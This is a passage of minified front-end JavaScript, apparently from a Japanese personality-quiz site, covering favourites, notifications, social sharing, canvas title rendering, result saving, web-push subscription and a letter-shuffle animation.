          var e = $(this).data("shindan_id");
          $.ajax({
            url: "/deleteFavorite",
            type: "POST",
            dataType: "json",
            data: {
              shindan_id: e
            },
            context: $(this)
          }).done(function (t) {
            $(".label-favorite-container-index-" + e).html(t.favoriteLabelIndex), $(".label-favorite-container-shindan-" + e).html(t.favoriteLabelShindan), $("#favorite-shindan-row-" + e).fadeOut(1500), setTimeout(function () {
              $("#favorite-shindan-row-" + e).remove();
            }, 2e3), $(".favorite-btn-" + e).addClass(t.favoriteButton.btn_class_add), $(".favorite-btn-" + e).removeClass(t.favoriteButton.btn_class_remove), $(".favorite-icon-" + e).addClass(t.favoriteButton.icon_class_add), $(".favorite-icon-" + e).removeClass(t.favoriteButton.icon_class_remove), $(".favorite-text-" + e).text(t.favoriteButton.text), $(".favorite-num-" + e).text(t.favoritesNum), $(".favorite-btn-" + e).attr("title", t.favoriteButton.long_text), $(".favorite-btn-" + e).attr("data-original-title", t.favoriteButton.long_text), $(".favorite-roundnum-withMargin-" + e).html(t.favoritesRoundNumWithMargin), $(".favorite-long_text-" + e).text(t.favoriteButton.long_text), showAlertToast(t.message, "success");
          }).fail(function () {
            showAlertToast("Error", "danger");
          });
        }), "ontouchstart" in document.documentElement || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) try {
          for (var y in document.styleSheets) {
            var b = document.styleSheets[y];
            if (b.rules) for (var w = b.rules.length - 1; w >= 0; w--) b.rules[w].selectorText && b.rules[w].selectorText.match(":hover") && b.deleteRule(w);
          }
        } catch (e) {}
        function _() {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null,
            t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [],
            n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
          auth_check && "undefined" != typeof mypageNotificationFlg && (n && $("#index").html(block_spinner), $.ajax({
            url: "/mypage/notification",
            type: "POST",
            dataType: "json",
            data: {
              mode: e,
              checkids: t,
              notificationTime
            }
          }).done(function (e) {
            n && $("#index").empty(), $("#next-notifications-block").remove(), $(e.html).appendTo("#index").hide().fadeIn(fadeTime), r.Z.parse(document.getElementById("index"), {
              base: twemoji_asset
            });
          }).fail(function () {}));
        }
        function E(e, t, n) {
          var r = $("#" + e + "-share-twitter-submit"),
            i = e + "-share-twitter-icon-spinner",
            o = e + "-share-twitter-icon-check",
            a = '<i id="' + o + '" class="fa-solid fa-check fa-fw mr-2"></i>';
          "comment" == e && ($("#" + e + "-share-twitter-icon").hide(), r.prop("disabled", !0), r.prepend('<i id="' + i + '" class="fas fa-circle-notch fa-spin fa-fw mr-2"></i>')), $.ajax({
            url: "/tweet",
            type: "POST",
            dataType: "json",
            data: {
              tweetText: t
            }
          }).done(function (t) {
            dataLayer.push({
              event: "Share",
              "share-action": n
            }), showAlertToast(t.message, t.class), $("#" + i).remove(), $(r).prepend(a), "comment" == e && ($("#" + e + "-share-twitter-textarea").val(""), r.prop("disabled", !0), $("#" + e + "-share-twitter-length").text("")), s = !1, setTimeout(function () {
              $("#" + o).remove(), $("#" + e + "-share-twitter-icon").show();
            }, 3e3);
          }).fail(function () {
            showAlertToast("Error", "danger"), $("#" + i).remove(), $("#" + e + "-share-twitter-icon").show(), r.prop("disabled", !1);
          });
        }
        function x(e, t) {
          if (s == e) return !1;
          s = e, 1 == e ? ($("#" + t + "-share-twitter-length").removeClass("text-danger").addClass("text-muted"), $("#" + t + "-share-twitter-submit").prop("disabled", !1)) : ($("#" + t + "-share-twitter-length").removeClass("text-muted").addClass("text-danger"), $("#" + t + "-share-twitter-submit").prop("disabled", !0));
        }
        $(document).on("change", "#TosAgreement", function () {
          $(this).prop("checked") ? $("#save").prop("disabled", !1) : $("#save").prop("disabled", !0);
        }), $(document).on("click", "#next-notifications", function () {
          var e = $(this).data("mode"),
            t = $(this).data("checkids");
          $(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), _(e, t);
        }), $(document).on("change", "#notifications_filter", function () {
          $("#index").empty(), _($(this).val());
        }), $(document).on("click", "#next-mydata", function () {
          var e = $(this).data("nextpageurl"),
            t = $(this).data("data");
          $(this).children("i").remove(), $(this).prepend(btn_spinner).prop("disabled", !0), $.ajax({
            url: e,
            type: "POST",
            dataType: "json",
            data: t
          }).done(function (e) {
            $("#next-mydata-block").remove(), $(e.html).appendTo("#mydata-tbody").hide().fadeIn(fadeTime), $(e.readmore).appendTo("#mydata").hide().fadeIn(fadeTime);
          }).fail(function () {});
        }), window.record_campaigns_share_click = function (e, t) {
          $.ajax({
            type: "POST",
            url: "/campaigns/share_click",
            data: {
              campaign_id: e,
              to: t
            },
            success: function (e) {},
            error: function () {}
          });
        }, $(document).on("click", "#comment-share-twitter-submit", function () {
          var e = $("#comment-share-twitter-textarea"),
            t = e.val() + "\n\n" + e.data("comment_add_text"),
            n = "https://twitter.com/intent/tweet?text=" + encodeURIComponent(t),
            r = "TweetComment";
          0 == modal_share_twitter ? (dataLayer.push({
            event: "Share",
            "share-action": r
          }), window.open(n, "_blank")) : 1 == modal_share_twitter && E("comment", t, r);
        }), $(document).on("click", "#modal-share-twitter-submit", function () {
          E("modal", $("#modal-share-twitter-textarea").val(), "TweetInside");
        }), $(document).on("click", ".share-to", function () {
          var e,
            t,
            n = $(this).data("share_target");
          switch ("undefined" != typeof campaign_id && campaign_id && record_campaigns_share_click(campaign_id, n), n) {
            case "facebook":
            case "line":
            case "mixi":
            case "weibo":
            case "mastodon":
            case "misskey":
              dataLayer.push({
                event: "Share",
                "share-action": n
              });
              var r = window.screenTop + window.innerHeight / 2 - 300,
                i = window.screenLeft + window.innerWidth / 2 - 300;
              window.open($(this).data("share_url"), "shareWindow", "width=600, height=600, top=" + r + ", left=" + i + " ,scrollbars=no,status=no,toolbar=no,location=no,menubar=no,resizable=yes").focus();
              break;
            case "kakaotalk":
              dataLayer.push({
                event: "Share",
                "share-action": n
              }), e = $(this).data("share_url"), t = decodeURIComponent($(this).data("share_text")), Kakao.Link.sendDefault({
                objectType: "text",
                text: htmlspecialchars_decode(t, 3),
                link: {
                  mobileWebUrl: e,
                  webUrl: e
                },
                buttons: [{
                  title: "진단",
                  link: {
                    mobileWebUrl: e,
                    webUrl: e
                  }
                }]
              });
              break;
            case "webshareapi":
              dataLayer.push({
                event: "Share",
                "share-action": n
              }), function (e, t) {
                navigator.share ? navigator.share({
                  title: htmlspecialchars_decode(e, 3),
                  text: htmlspecialchars_decode(t, 3)
                }) : bootbox.alert({
                  message: "This button is not available on this browser.",
                  centerVertical: !0,
                  size: "small",
                  backdrop: !0
                });
              }(decodeURIComponent($(this).data("share_title")), decodeURIComponent($(this).data("share_text")));
              break;
            case "etc":
              $("#shareModal").modal("show");
          }
        }), $(document).on("click", "a.btn-twitter, a.btn-twitter-at", function () {
          "undefined" != typeof campaign_id && campaign_id && $.ajax({
            type: "POST",
            url: "/campaigns/share_click",
            data: {
              campaign_id,
              to: "twitter"
            }
          });
        }), $(document).on("change keydown keyup", ".share-twitter-textarea", function () {
          var e = $(this).val(),
            t = $(this).data("target");
          "comment" == t && (e += "\n" + $(this).data("comment_add_text")), function (e, t) {
            if (1 == auth_check) {
              var n = twitter.default.parseTweet(e).weightedLength;
              if (n <= 280) var r = Math.ceil(280 - n);else r = Math.floor(280 - n);
              x(r >= 0, t), $("#" + t + "-share-twitter-length").html(r);
            }
          }(e, t);
        }), $(document).on("click", ".btn-modal-terms_of_service", function () {
          $.ajax({
            url: "/modal_terms_of_service",
            type: "POST",
            dataType: "html"
          }).done(function (e) {
            $("#modal-terms_of_service-body").html(e), $("#modal-terms_of_service").modal();
          }).fail(function () {});
        }), $(document).on("click", ".btn-modal-privacy_policy", function () {
          $.ajax({
            url: "/modal_privacy_policy",
            type: "POST",
            dataType: "html"
          }).done(function (e) {
            $("#modal-privacy_policy-body").html(e), $("#modal-privacy_policy").modal();
          }).fail(function () {});
        }), window.setLoadAllCallback = function (e, t) {
          for (var n = 0, r = 0; r < e.length; ++r) e[r].onload = function () {
            ++n == e.length && t(e);
          };
        }, window.setCanvas = function (e, t) {
          var n = document.getElementById(e),
            r = n.getContext("2d");
          if (r.clearRect(0, 0, n.width, n.height), t) {
            var i = new Image();
            i.crossOrigin = "Anonymous", i.src = t, i.onload = function () {
              var e = n.width / i.width,
                t = i.width * e,
                o = i.height * e;
              r.drawImage(i, 0, 0, t, o);
            };
          }
        }, window.setCanvasBgColor = function (e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "#000000",
            n = document.getElementById(e),
            r = n.getContext("2d");
          r.fillStyle = t, r.fillRect(0, 0, n.width, n.height);
        }, window.drawShindanTitleText = function (e, t, n) {
          var r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 81,
            i = arguments.length > 4 ? arguments[4] : void 0,
            o = arguments.length > 5 ? arguments[5] : void 0,
            a = arguments.length > 6 ? arguments[6] : void 0,
            u = arguments.length > 8 && void 0 !== arguments[8] && arguments[8],
            s = document.getElementById(e),
            d = s.getContext("2d");
          if (d.clearRect(0, 0, s.width, s.height), 0 != r) {
            var l = s.width,
              c = s.height,
              f = {
                x: l / 2,
                y: c / 2
              },
              h = r;
            !function () {
              var c = .68 * l;
              d.font = r + "px " + n;
              f.y;
              if (isEn(t.title)) var p = t.title_array_sp;else p = t.title_array;
              p.length;
              var m = "",
                g = "",
                v = [];
              $.each(p, function (e, t) {
                g = m + t, d.measureText(g).width > c && (v.push(m), m = "", g = "", 0), m += t, 1;
              }), v.push(m);
              var y = 0,
                b = !1,
                w = [];
              $.each(v, function (e, t) {
                if (y += 1, "" != t) {
                  if (d.measureText(t).width > c) {
                    var n = Array.from(t),
                      r = "",
                      i = "";
                    $.each(n, function (e, t) {
                      i = r + t, d.measureText(i).width <= c ? r += t : (r = Array.from(r).slice(0, -1).join("") + "…", b = e);
                    }), t = r;
                  }
                  if (w.push(t), b) return !1;
                }
              });
              for (var _ = w.length, E = 1.3, x = w.length > 5 ? 5 : w.length; x > 0 && h * (x - 1) * E + h > .68 * s.height;) x -= 1;
              var T = x,
                C = [],
                S = (y = 0, 0),
                D = !1;
              $.each(w, function (e, t) {
                y++, t = t.trim(), y == T && _ > T && (t = Array.from(t).slice(0, -1).join("") + "...", D = !0);
                var n = d.measureText(t);
                if (n.width > S && (S = n.width), C.push(t), D) return !1;
              });
              var A = 0;
              function k(e) {
                var t = f.y - Math.round((h * T + Math.round(h * E - h) * (T - 1)) / 2) + h / 2;
                y = 0, $.each(C, function (n, r) {
                  if (y++, "line" == e && o > 0 && (d.strokeStyle = a, d.lineWidth = o, d.strokeText(r, A, t)), "text" == e && (d.fillStyle = i, d.fillText(r, A, t)), t += h * E, y >= T) return !1;
                });
              }
              1 == T ? (d.textAlign = "center", A = f.x) : (d.textAlign = "left", A = (l - S) / 2), d.textBaseline = "middle", k("line"), k("text"), u && setTimeout(function () {
                !function (e) {
                  var t = {};
                  t.shindan_id = shindanTitleShindanId, t.image = $("#" + e).get(0).toDataURL("image/png"), $.ajax({
                    url: "/shindanTitleUpload",
                    type: "POST",
                    data: t,
                    success: function (e) {
                      $("#shindanTitleCanvasWrapper").remove();
                    },
                    error: function () {}
                  });
                }(e);
              }, 1e3);
            }();
          }
        }, window.drawCenterPath = function (e, t, n) {
          e.beginPath(), e.strokeStyle = "red", e.lineWidth = 5, e.moveTo(t / 2, 0), e.lineTo(t / 2, n), e.stroke(), e.beginPath(), e.strokeStyle = "red", e.lineWidth = 5, e.moveTo(0, n / 2), e.lineTo(t, n / 2), e.stroke();
        }, window.isEn = function (e) {
          for (var t = !0, n = 0; n < e.length; n++) if (e.charCodeAt(n) >= 256) {
            t = !1;
            break;
          }
          return t;
        }, $(document).on("click", "#saveShindanResultSubmit", function () {
          if (auth_check) {
            var e = {};
            e.saveResult = $(this).data("save_result"), e.shindan_id = shindan_info.id;
            var t = 0;
            $("#saveShindanResult_private").is(":checked") && (t = 1), e.private = t, e.comment = $("#post-comment").val();
            var n = $(this).data("text_saved");
            $.ajax({
              url: "/saveResult",
              type: "POST",
              data: e,
              success: function (e) {
                $("#save_result_message").html('<span class="text-' + e.cls + '">' + e.message + "</span>").show(), e.html && ($("#timeline_block").hasClass("d-none") && $("#timeline_block").removeClass("d-none"), $("#resultRows").prepend(e.html).hide().fadeIn(3e3), r.Z.parse(document.getElementById("resultRows"), {
                  base: twemoji_asset
                }), $("#be-the-first-timeline").length > 0 && $("#be-the-first-timeline").remove(), lazyload(), adjustTimelineHeight()), setTimeout(function () {
                  "success" == e.cls && $("#saveShindanResultSubmit").html('<i class="fa-solid fa-check mr-1"></i>' + n), $("#saveShindanResultSubmit").prop("disabled", !0), $("#saveShindanResult_private").prop("disabled", !0), $("#post_display").addClass("text-muted"), $("#post-comment").prop("disabled", !0);
                }, 100);
              },
              error: function () {
                $("#save_result_message").html('<span class="text-danger">Error</span>').show();
              }
            });
          } else $("#login-modal").modal("show");
        }), $(document).on("click", "#editShindanResultSubmit", function () {
          var e = $("#editShindanResult"),
            t = 0;
          $("#saveShindanResult_private").is(":checked") && (t = 1), e.append($("<input />", {
            type: "hidden",
            name: "result_id",
            value: result_id
          })), e.append($("<input />", {
            type: "hidden",
            name: "private",
            value: t
          })), $("#editShindanResult").submit();
        }), $(document).on("click", "#deleteShindanResultSubmit", function () {
          $("#deleteShindanResult").append($("<input />", {
            type: "hidden",
            name: "result_id",
            value: result_id
          })), $("#deleteShindanResult").submit();
        }), $(document).ready(function () {
          var e,
            t = function () {
              $(window).width() != windowWidth && $.ajax({
                type: "POST",
                url: "/setWindowWidth",
                data: {
                  windowWidth: $(window).width()
                }
              });
            };
          t(), $(window).resize(function () {
            e && clearTimeout(e), e = setTimeout(t, 1e3);
          }), function () {
            var e = window.navigator.userAgent.toLowerCase(),
              t = -1 !== e.indexOf("iphone") || -1 !== e.indexOf("ipad") || -1 !== e.indexOf("ipod");
            if ("undefined" == typeof Notification || !("PushManager" in window)) return void (t && (parseFloat(("" + (/CPU.*OS ([0-9_]{1,5})|(CPU like).*AppleWebKit.*Mobile/i.exec(navigator.userAgent) || [0, ""])[1]).replace("undefined", "3_2").replace("_", ".").replace("_", "")) || !1) >= 16.4 && ($(".webpush_subscribe_container").show(), T = !0));
            $(".webpush_subscribe_container").show();
            "serviceWorker" in navigator && window.addEventListener("load", function () {
              var e = this;
              navigator.serviceWorker.register("/sw.js").then(function (t) {
                e.registration = t;
              }).catch(function (e) {});
            });
            "granted" === Notification.permission && ($(".webpush_subscribe_infomation").hide(), T = !1);
          }();
        }), $(document).on("click", ".delete-usersLinks", function () {
          $("<form/>", {
            action: usersLinksDeleteUrl,
            method: "post"
          }).append($("<input/>", {
            type: "hidden",
            name: "id",
            value: $(this).data("id")
          })).append($("<input/>", {
            type: "hidden",
            name: "_token",
            value: $('meta[name="csrf-token"]').attr("content")
          })).appendTo(document.body).submit();
        }), window.effectShuffle = function (e, t, n, r) {
          setTimeout(function () {
            var r = $("#effect_shuffle_" + e),
              i = t;
            r.shuffleLetters({
              text: i,
              step: Number(n)
            });
          }, Number(r));
        }, window.shindanEffects = function () {
          if ($(".shindanEffects").length) {
            window.result_remaining_tasks += $(".shindanEffects").length;
            var e = Promise.resolve();
            setTimeout(function () {
              $.each($(".shindanEffects"), function (t, n) {
                var r = t + 1 == $(".shindanEffects").length;
                e = e.then(shindanEffectsLoop.bind(this, t, n, r));
              });
            }, 100);
          }
        }, window.shindanEffectsLoop = function (e, t, n) {
          return new Promise(function (e, i) {
            function o(n) {
              setTimeout(function () {
                return $(t).removeClass("typewritercursor"), window.result_remaining_tasks += -1, e();
              }, n);
            }
            $(t).hasClass("typewritercursor") || $(t).addClass("typewritercursor");
            var a = n ? 3e3 : 0;
            setTimeout(function () {
              "ef_typing" == $(t).data("mode") ? $.each($(t).data("text"), function (e, n) {
                setTimeout(function () {
                  $(t).append(n), $(t).data("text").length == Number(e) + 1 && o(a), r.Z.parse(document.getElementById("shindanResult"), {
                    base: twemoji_asset
                  });
                }, Number($(t).data("interval")) * e);
              }) : "ef_shuffle" == $(t).data("mode") && $(t).shuffleLetters({
                text: JSON.parse($(t).data("text")),
                step: Number(JSON.parse($(t).data("step"))),
                callback: function () {
                  o(a);
                }
              });
            }, Number($(t).data("timeout")));
          });
        }, $(document).on("click", "a.campaign_banner", function () {
          event.preventDefault(), $.ajax({
            type: "POST",
            url: "/campaigns/banner_click",
            data: {
              campaign_id: $(this).data("campaign_id")
            },
            context: $(this),
            success: function (e) {
              window.location.href = $(this).data("url");
            },
            error: function () {}
          });
        }), window.shindanDescriptionsHeight = function () {
          var e = document.querySelector("#shindanDescription");
          if (e) {
            var t = e.clientHeight,
              n = getComputedStyle(e).getPropertyValue("line-height");
            t > 8 * (n = n.replace(/[^-\d\.]/g, "")) && (e.style.height = "".concat(8 * n, "px"), $("#shindanDescriptionReadMoreBtn").show(), $("#shindanDescriptionGradient").show());
          }
          $(document).on("click", ".shindanDescriptionReadMoreBtn", function () {
            $("#shindanDescription") && ($("#shindanDescription").toggleClass("is-open"), $("#shindanDescriptionGradient").toggle(), $(".shindanDescriptionReadMoreBtn").toggle());
          });
        };
        var T = !1;
        var C = !1;
        $(document).on("click", ".webpush_subscribe", function () {
          C || $.ajax({
            url: "/webpush/getModal",
            type: "POST",
            dataType: "json"
          }).done(function (e) {
            $("#webpush_modal_title").html(e.title), $("#webpush_modal_body").html(e.body), C = !0, T && ($("#webpush_subscribe_button").prop("disabled", !0), $("#webpush_addhome_ios").show());
          }), $("#webpush_modal").modal("show");
        }), $(document).on("click", "#webpush_subscribe_button", function () {
          $.ajax({
            url: "/webpush/getMessage",
            type: "POST",
            dataType: "json",
            async: !1
          }).done(function (e) {
            var t = e,
              n = !1,
              r = !1;
            if ("undefined" == typeof Notification && (n = t.unavailable, r = "danger"), "denied" === Notification.permission && (n = t.denied, r = "warning"), "granted" === Notification.permission && (n = t.granted, r = "success"), "PushManager" in window || (n = t.unavailable, r = "danger"), n) return showAlertToast(n, r), void $("#webpush_modal").modal("hide");
            var i = {
                userVisibleOnly: !0
              },
              o = webpush_vapid_public_key;
            o && (i.applicationServerKey = function (e) {
              for (var t = "=".repeat((4 - e.length % 4) % 4), n = (e + t).replace(/\-/g, "+").replace(/_/g, "/"), r = window.atob(n), i = new Uint8Array(r.length), o = 0; o < r.length; ++o) i[o] = r.charCodeAt(o);
              return i;
            }(o)), registration.pushManager.subscribe(i).then(function (e) {
              $("#webpush_subscribe_button").prop("disabled", !0);
              var n = document.querySelector('meta[name="csrf-token"]').getAttribute("content");
              fetch("/webpush/subscribe", {
                method: "POST",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  "X-CSRF-Token": n
                },
                body: JSON.stringify(e)
              }).then(function () {
                showAlertToast(t.done, "success"), $("#webpush_subscribe_button").prop("disabled", !1), $("#webpush_modal").modal("hide");
              });
            });
          });
        }), $(document).on("click", ".btn-shindanResultSave-modal", function () {
          $("#modal-saveShindanResult").modal("show");
        }), $(document).on("click", ".reaction-btn", function () {
          if (auth_check) {
            var e = $(this).data("id"),
              t = $(this).data("m"),
              n = $(this).data("zero");
            $.ajax({
              url: "/reactions/post",
              type: "POST",
              dataType: "json",
              data: {
                id: e,
                m: t,
                zero: n
              }
            }).done(function (n) {
              $(".reaction-iconwrapper-" + t + "-" + e).html(n.icon), $(".reaction-num-" + t + "-" + e).html(n.num);
              var r = "fa-beat",
                i = $(".reaction-icon-" + t + "-" + e),
                o = 1 == n.status ? "1.5" : ".5";
              i.addClass(r).css("--fa-beat-scale", o), setTimeout(function () {
                i.removeClass(r).css("--fa-beat-scale", ""), $(".reaction-btn-" + t + "-" + e).attr("title", n.title).tooltip("dispose").tooltip();
              }, 1e3);
            }).fail(function () {});
          } else $("#login-modal").modal("show");
        }), $(document).on("click", ".password-toggle", function () {
          var e = $(this).data("changeto"),
            t = htmlspecialchars_decode($(this).data("password_text_show")),
            n = htmlspecialchars_decode($(this).data("password_text_hide")),
            r = $(this).data("target");
          "show" == e && ($(this).html(n), $(this).data("changeto", "hide"), $(r).attr("type", "text")), "hide" == e && ($(this).html(t), $(this).data("changeto", "show"), $(r).attr("type", "password")), $(r).trigger("focus");
        });
        var S = [];
        function D(e, t) {
          if (void 0 !== $("#shindan_branch_content_" + t).html()) {
            var n = $("#shindanInput").val().length > 0 ? htmlspecialchars($("#shindanInput").val()) : htmlspecialchars($("#hiddenName").val());
            changeUserNameOfBranch(t, n);
          }
          if ($("#shindanFormBlock").length > 0) {
            var r = $(window).scrollTop(),
              i = $("#shindanFormBlock").offset().top - 70;
            r > i && $("body,html").animate({
              scrollTop: i
            }, 300, "swing");
          }
          $("#shindan_branch_" + e).fadeOut(1e3, "swing", function () {
            $("#shindan_branch_" + t).fadeIn(500);
          });
        }
        $(document).on("click", ".btn-next-branch", function () {
          var e = $(this).data("current_branch"),
            t = $(this).data("next_branch"),
            n = "undefined" != typeof shindanCreate;
          if (1 == $("#shindan_branch_" + t).data("kind")) {
            if (n) return S.push(e), void D(e, t);
            var r = document.createElement("form");
            r.method = "POST", r.action = "/" + shindan_id + "/r";
            var i = document.createElement("input");
            i.type = "hidden", i.name = "shindanName", i.value = $("#shindanInput").val(), r.appendChild(i);
            var o = document.createElement("input");
            o.type = "hidden", o.name = "hiddenName", o.value = $("#hiddenName").val(), r.appendChild(o);
            var a = document.createElement("input");
            a.type = "hidden", a.name = "shindan_token", a.value = $("#shindan_token").val(), r.appendChild(a);
            var u = document.createElement("input");
            u.type = "hidden", u.name = "type", u.value = "branch", r.appendChild(u);
            var s = document.createElement("input");
            s.type = "hidden", s.name = "rbr", s.value = $("#shindan_branch_" + t).data("rbr"), r.appendChild(s);
            var d = document.createElement("input");
            return d.type = "hidden", d.name = "_token", d.value = $('meta[name="csrf-token"]').attr("content"), r.appendChild(d), document.body.appendChild(r), void r.submit();
          }
          return S.push(e), void D(e, t);
        }), $(document).on("click", ".btn-back-branch", function () {
          var e = $(this).data("current_branch"),
            t = S.slice(-1)[0];
          S.pop(), D(e, t);
        }), window.changeUserNameOfBranch = function (e, t) {
          var n = $("#shindan_branch_content_" + e).html();
          if ($("#shindan_branch_content_" + e + " .branch_user_name").length > 0) $("#shindan_branch_content_" + e + " .branch_user_name").text(t);else {
            var r = n.replaceAll("[USER]", '<span class="branch_user_name font-weight-bold">' + t + "</span>");
            $("#shindan_branch_content_" + e).html(r);
          }
        }, window.shortenText = function (e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 100,
            n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
            r = [],
            i = "";
          if (e.length > t) {
            for (var o = 0; o < (t - 1) / t; o++) r.push(e.substr(o * t, t));
            i = r.join() + n;
          } else i = e;
          return i;
        }, window.adjustTimelineHeight = function () {
          $(".timeline-text-comment-block").each(function () {
            $(this).prop("scrollHeight") > 400 && $(this).find(".tweet-show-more-background,.tweet-show-more-background-comment").show();
          }), $(".tweet-show-more-btn").click(function () {
            $(this).closest(".timeline-text-comment-block").addClass("expanded"), adjustShindanTimelineHeight();
          }), $(".tweet-show-less-btn").click(function () {
            $(this).closest(".timeline-text-comment-block").removeClass("expanded");
          });
        }, window.adjustShindanTimelineHeight = function () {
          $(".timeline-block").each(function () {
            $(this).prop("scrollHeight") > 600 && $(this).find(".timeline-show-more-background").show();
          }), $(".timeline-show-more-btn").click(function () {
            $(this).closest(".timeline-block").addClass("timeline-block-expanded");
          });
        }, $(document).on("click", ".close_modal", function () {
          var e = $(this).data("target");
          $(e).modal("hide");
        });
        var A = document.getElementById("languageSelector");
        A && (document.getElementById("languageSelector").addEventListener("click", function (e) {
          e.stopPropagation();
        }), A.addEventListener("change", function () {
          window.location.href = this.value;
        })), $(document).on("click", ".emoji-comment", function () {
          var e = $(this).data("emoji"),
            t = $("#post-comment").val();
          $("#post-comment").val(t + e);
        }), $(document).on("click", "#post-comment", function () {
          auth_check || $("#login-modal").modal("show");
        });
      },
      3470: (e, t, n) => {
        "use strict";

        n.r(t);
        var r = n(5623);
        !function (e) {
          function t(e, t) {
            var n = "";
            "lowerLetter" == e || "upperLetter" == e || "symbol" == e ? n = t + "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθικλμνξοπρςτυφχψωАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюя" : "emoji" == e ? n = t + "😄😃😀😊☺😉😍😘😚😗😙😜😝😛😳😁😔😌😒😞😣😢😂😭😪😥😰😅😓😩😫😨😱😠😡😤😖😆😋😷😎😴😵😲😟😦😧😈👿😮😬😐😕😯😶😇😏😑👲👳👮👷💂👶👦👧👨👩👴👵👱👼👸😺😸😻😽😼🙀😿😹😾👹👺🙈🙉🙊💀👽💩🔥✨🌟💫💥💢💦💧💤💨👂👀👃👅👄👍👎👌👊✊✌👋✋👐👆👇👉👈🙌🙏☝👏💪🚶🏃💃👫👪👬👭💏💑👯🙆🙅💁🙋💆💇💅👰🙎🙍🙇🎩👑👒👟👞👡👠👢👕👔👚👗🎽👖👘👙💼👜👝👛👓🎀🌂💄💛💙💜💚❤💔💗💓💕💖💞💘💌💋💍💎👤👥💬" : "zenkaku" == e && (n = t + "あいうえおかがきぎくぐけげこごさざしじすずせぜそぞただちぢつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをんアイウエオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴ，．？／＼＼（＾）！［］｛｝＊＆＾％＄＃＇＼：一右雨円王音下火花貝学気九休玉金空月犬見五口校左三山子四糸字耳七車手十出女小上森人水正生青夕石赤千川先早草足村大男竹中虫町天田土二日入年白八百文木本名目立力林六引羽雲園遠何科夏家歌画回会海絵外角楽活間丸岩顔汽記帰弓牛魚京強教近兄形計元言原戸古午後語工公広交光考行高黄合谷国黒今才細作算止市矢姉思紙寺自時室社弱首秋週春書少場色食心กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ아이우에오카키쿠케코사시스세소타치츠테토나니누네노하히후헤호마미무메모야유요라리루레로와오가기구게고자지즈제조다지즈데도바비부베보파피푸페포ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ");
            var r = n.split(/(?![\uDC00-\uDFFF])/);
            return r[Math.floor(Math.random() * r.length)];
          }
          e.fn.shuffleLetters = function (n) {
            var i = e.extend({
                step: 10,
                fps: 16,
                text: "",
                callback: function () {}
              }, n),
              o = "";
            return this.each(function () {
              var n = e(this),
                a = "";
              if (n.data("animated")) return !0;
              n.data("animated", !0), i.text ? (a = i.text.split(/(?![\uDC00-\uDFFF])/), o = i.text) : (a = n.text().split(/(?![\uDC00-\uDFFF])/), o = n.text());
              for (var u = [], s = [], d = 0; d < a.length; d++) {
                var l = a[d];
                " " != l ? (/[a-z]/.test(l) ? u[d] = "lowerLetter" : /[A-Z]/.test(l) ? u[d] = "upperLetter" : /(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u265F\u2660\u2663\u2665\u2666\u2668\u267B\u267E\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26A7\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDED5-\uDED7\uDEDC-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEFC\uDFE0-\uDFEB\uDFF0]|\uD83E[\uDD0C-\uDD3A\uDD3C-\uDD45\uDD47-\uDDFF\uDE70-\uDE7C\uDE80-\uDE88\uDE90-